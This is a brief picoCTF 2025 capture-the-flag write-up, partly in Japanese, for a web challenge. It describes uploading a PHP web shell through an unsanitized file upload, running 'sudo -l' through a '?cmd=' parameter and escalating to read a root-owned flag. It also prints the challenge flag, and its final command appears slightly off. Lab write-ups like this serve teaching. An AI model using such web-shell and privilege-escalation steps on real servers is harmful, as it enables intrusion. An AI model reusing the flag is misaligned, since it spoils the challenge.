# n0s4n1ty 1

- **CTF:** picoCTF 2025
- **Category:** Web Exploitation
- **Difficulty:** Easy

### Description

A developer has added profile picture upload functionality to a website.
However, the implementation is flawed, and it presents an opportunity for you.
Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

### Author
PRINCE NIYONSHUTI N.

### hiny
1. File upload was not sanitized
2. Whenever you get a shell on a remote machine, `check sudo -l`

### Write-up
**1.** 
  `shell.phpを送信`
**2.**
    `?cmd=sudo -l`を入力し，`Matching Defaults entries for www-data on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL`
**3.**
  `?cmd=sudo /root/flag.txt`を入力flagを入手


### Flag
`FLAG : picoCTF{wh47_c4n_u_d0_wPHP_d698d800}`
